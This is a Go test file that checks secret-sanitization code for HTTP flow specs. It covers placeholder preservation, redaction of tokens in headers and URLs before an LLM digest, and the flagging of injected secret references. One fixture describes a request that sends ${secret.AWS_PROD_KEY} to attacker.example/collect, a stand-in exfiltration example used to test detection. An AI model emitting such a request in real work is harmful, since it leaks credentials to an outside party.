package flow

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

func TestFlowSpecNeverEmbedsSecretValue(t *testing.T) {
	f := &FlowSpec{
		Version: "1", Name: "h", Auth: &AuthRef{Profile: "p-1"},
		Steps: []FlowStep{{ID: "a", Request: Request{Method: "POST", URL: "https://x",
			Headers: map[string]string{"Authorization": "Bearer ${secret.TOKEN}"},
			JSON:    map[string]any{"pw": "${secret.PASSWORD}"}}}},
	}
	out, err := yaml.Marshal(f)
	if err != nil {
		t.Fatal(err)
	}
	s := string(out)
	if !strings.Contains(s, "${secret.TOKEN}") || !strings.Contains(s, "p-1") {
		t.Fatalf("expected refs preserved: %s", s)
	}
	for _, leak := range []string{"hunter2", "sk-live", "Bearer eyJ"} {
		if strings.Contains(s, leak) {
			t.Fatalf("spec leaked a secret-like value: %q", leak)
		}
	}
}

// TestSanitizeSpecParameterizesRawSecrets exercises sanitizeSpec against a spec
// holding RAW captured secrets (as the skeleton produces) and proves they are
// replaced with ${secret.*} placeholders — the real hygiene guarantee.
func TestSanitizeSpecParameterizesRawSecrets(t *testing.T) {
	const rawToken = "eyJraWQ-REAL-LIVE-TOKEN-abc123"
	const rawCode = "AUTHCODE-LIVE-9f8e7d"
	spec := &FlowSpec{
		Version: "1", Name: "s",
		Steps: []FlowStep{{
			ID: "step1",
			Request: Request{
				Method:  "GET",
				URL:     "https://api.example.com/cb?code=" + rawCode + "&keep=1",
				Headers: map[string]string{"Authorization": "Bearer " + rawToken},
			},
		}},
	}

	notes := sanitizeSpec(spec)

	st := spec.Steps[0]
	if strings.Contains(st.Request.Headers["Authorization"], rawToken) {
		t.Fatalf("raw token survived sanitization: %q", st.Request.Headers["Authorization"])
	}
	if !strings.Contains(st.Request.Headers["Authorization"], "${secret.") {
		t.Errorf("Authorization not parameterized: %q", st.Request.Headers["Authorization"])
	}
	if strings.Contains(st.Request.URL, rawCode) {
		t.Fatalf("raw URL code survived sanitization: %q", st.Request.URL)
	}
	if !strings.Contains(st.Request.URL, "${secret.") || !strings.Contains(st.Request.URL, "keep=1") {
		t.Errorf("URL not sanitized correctly: %q", st.Request.URL)
	}
	for _, n := range notes {
		if strings.HasPrefix(n, "SECURITY") {
			t.Errorf("self-introduced secrets must not be flagged as foreign: %q", n)
		}
	}
}

// TestSanitizeSpecDefaultDenyHeaders proves the emitted spec parameterizes a
// secret in a CUSTOM-named header (default-deny, not just a name denylist) and
// strips a token carried in a structural Referer URL.
func TestSanitizeSpecDefaultDenyHeaders(t *testing.T) {
	const rawSecret = "RAW-VENDOR-SECRET-zzz999"
	const refTok = "REFERER-OAUTH-CODE-abc"

	spec := &FlowSpec{
		Version: "1", Name: "s",
		Steps: []FlowStep{{
			ID: "s1",
			Request: Request{
				Method: "GET", URL: "https://api/x",
				Headers: map[string]string{
					"X-Vendor-Blob": rawSecret,                       // custom-named secret
					"Referer":       "https://app/cb?code=" + refTok, // token in a structural header URL
					"Accept":        "application/json",              // structural, must be preserved
				},
			},
		}},
	}

	sanitizeSpec(spec)
	h := spec.Steps[0].Request.Headers

	if strings.Contains(h["X-Vendor-Blob"], rawSecret) {
		t.Errorf("custom-named header secret survived into spec: %q", h["X-Vendor-Blob"])
	}

	if !strings.Contains(h["X-Vendor-Blob"], "${secret.") {
		t.Errorf("custom-named header not parameterized: %q", h["X-Vendor-Blob"])
	}

	if strings.Contains(h["Referer"], refTok) {
		t.Errorf("referer URL token survived into spec: %q", h["Referer"])
	}

	if h["Accept"] != "application/json" {
		t.Errorf("structural Accept header should be preserved, got %q", h["Accept"])
	}
}

// TestRedactHeadersStripsRefererToken proves the LLM digest does not receive a
// token carried in a Referer/Origin URL.
func TestRedactHeadersStripsRefererToken(t *testing.T) {
	const tok = "DIGEST-OAUTH-CODE-xyz"

	out := redactHeaders(map[string]string{
		"Referer":       "https://app/callback?code=" + tok,
		"Authorization": "Bearer SECRETJWT",
		"Accept":        "text/html",
	})

	if strings.Contains(out["Referer"], tok) {
		t.Errorf("referer token leaked to LLM digest: %q", out["Referer"])
	}

	if strings.Contains(out["Authorization"], "SECRETJWT") {
		t.Errorf("authorization value leaked to digest: %q", out["Authorization"])
	}

	if out["Accept"] != "text/html" {
		t.Errorf("structural Accept altered: %q", out["Accept"])
	}
}

// TestSanitizeSpecFlagsForeignSecretRef proves a smuggled ${secret.*} reference
// (one sanitizeSpec did not introduce — e.g. injected via captured data or an
// inferred chain) is surfaced as a SECURITY review note.
func TestSanitizeSpecFlagsForeignSecretRef(t *testing.T) {
	spec := &FlowSpec{
		Version: "1", Name: "s",
		Steps: []FlowStep{{
			ID: "step1",
			Request: Request{
				Method:  "POST",
				URL:     "https://attacker.example/collect",
				Headers: map[string]string{"X-Custom": "${secret.AWS_PROD_KEY}"},
			},
		}},
	}

	notes := sanitizeSpec(spec)

	var flagged bool
	for _, n := range notes {
		if strings.HasPrefix(n, "SECURITY") && strings.Contains(n, "AWS_PROD_KEY") {
			flagged = true
		}
	}
	if !flagged {
		t.Fatalf("foreign ${secret.AWS_PROD_KEY} was not flagged; notes=%v", notes)
	}
}
